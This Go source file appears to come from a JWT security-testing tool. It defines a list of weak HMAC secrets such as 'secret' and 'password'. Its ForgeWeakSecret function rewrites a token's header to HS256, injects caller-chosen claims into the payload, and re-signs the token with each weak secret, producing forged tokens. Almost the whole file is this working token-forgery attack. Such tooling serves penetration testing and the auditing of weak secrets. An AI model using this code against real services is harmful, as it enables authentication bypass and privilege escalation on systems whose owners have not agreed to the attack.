package jwt

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
)

// DefaultWeakSecrets is a list of common weak HMAC secrets used for re-signing tests.
var DefaultWeakSecrets = []string{
	"secret",
	"123456",
	"password",
	"admin",
	"key",
	"secret123",
}

// SignHS256 computes the HMAC-SHA256 signature for a header.payload signing input string.
func SignHS256(signingInput string, secret string) string {
	h := hmac.New(sha256.New, []byte(secret))
	h.Write([]byte(signingInput))
	return base64.RawURLEncoding.EncodeToString(h.Sum(nil))
}

// ForgeWeakSecret modifies payload claims and re-signs the JWT using HMAC-SHA256 with the specified secret(s).
func ForgeWeakSecret(token string, claims map[string]interface{}, customSecret string) ([]string, error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return nil, fmt.Errorf("token is not a valid 3-part JWT")
	}

	// 1. Decode & Ensure HS256 Header
	headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	var header map[string]interface{}
	if err == nil {
		json.Unmarshal(headerBytes, &header)
	} else {
		header = make(map[string]interface{})
	}
	header["alg"] = "HS256"
	if _, ok := header["typ"]; !ok {
		header["typ"] = "JWT"
	}

	newHeaderBytes, _ := json.Marshal(header)
	newHeaderB64 := base64.RawURLEncoding.EncodeToString(newHeaderBytes)

	// 2. Decode & Modify Payload
	payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return nil, fmt.Errorf("failed to base64 decode JWT payload: %w", err)
	}

	var payload map[string]interface{}
	if err := json.Unmarshal(payloadBytes, &payload); err != nil {
		return nil, fmt.Errorf("failed to parse JWT payload JSON: %w", err)
	}

	for k, v := range claims {
		payload[k] = v
	}

	newPayloadBytes, _ := json.Marshal(payload)
	newPayloadB64 := base64.RawURLEncoding.EncodeToString(newPayloadBytes)

	signingInput := fmt.Sprintf("%s.%s", newHeaderB64, newPayloadB64)

	secrets := DefaultWeakSecrets
	if customSecret != "" {
		secrets = []string{customSecret}
	}

	var forgedTokens []string
	for _, s := range secrets {
		sig := SignHS256(signingInput, s)
		forgedTokens = append(forgedTokens, fmt.Sprintf("%s.%s", signingInput, sig))
	}

	return forgedTokens, nil
}
